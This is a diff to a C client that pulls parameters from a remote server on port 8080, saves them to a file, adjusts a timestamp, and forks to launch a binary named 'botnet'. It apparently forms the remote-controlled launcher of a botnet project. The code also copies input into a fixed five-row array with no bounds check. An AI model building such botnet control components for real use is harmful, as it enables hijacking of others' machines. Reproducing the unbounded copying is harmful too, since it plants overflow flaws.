@@ -6,6 +6,7 @@
 #include <unistd.h>
 #include <sys/types.h>
 #include <sys/wait.h>
+#include <time.h>
 #define PORT 8080
 
 int main(int argc, char* argv[]){
@@ -26,37 +27,69 @@ int main(int argc, char* argv[]){
   serv_addr.sin_port = htons(PORT);
 
   if(inet_pton(AF_INET, argv[1], &serv_addr.sin_addr) <= 0){
+
     printf("%s\n", "Invalid IP Address");
     return -2;
+
   }
 
     if(connect(sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) < 0){
+
       printf("%s\n", "Unable to connect");
       return -3;
+
     }
+
   FILE* fl;
   fl = fopen("confr.txt", "w");
   while(read(sock, buffer, 2048) > 0){
-      //printf("%s", buffer);
+      //printf("%s\n", buffer);
       fprintf(fl, "%s", buffer);
+
   }
+
   fclose(fl);
   printf("%s\n", "Message received");
-  //printf("%s%s\n", "Message: ", buffer);
+
+  FILE* fk = fopen("confr.txt", "r");
+  char buffr[255];
+  int counter = 0;
+  char new_data[5][255];
 
 
-  char* args[] = {"./bot", "confr.txt", NULL};
+  while(fgets(buffr, 255, (FILE*) fk)) {
+      //printf("%s\n", buffr);
+      strcpy(new_data[counter], buffr);
+      counter ++;
+  }
+
+  fclose(fk);
+  time_t times;
+  times = time(NULL);
+  int tim = atoi(new_data[2]) + times;
+  //printf("%d\n", tim);
+  char buf[255];
+  sprintf(buf, "%d", tim);
+  strcpy(new_data[2], buf);
+
+
+  printf("%s\n", "Here");
     pid_t pid = fork();
-    printf("%d\n", pid);
+
     if(pid == -1){
-        printf("%s\n", "Faild to fork");
+
+        printf("%s\n", "Failed to fork");
         return 1;
+
     }else if (pid == 0){
+
       printf("%s\n", "Run bot");
-      execv("bot", args);
+      execl("./cmake-build-debug/botnet", "botnet", (const char*)new_data[0], (const char*)new_data[1], (const char*)new_data[2], (const char*)new_data[3], (const char*)new_data[4], NULL);
+
     }else{
       int status;
       while (wait(&status) != pid){}
+
     }
 
   return 0;
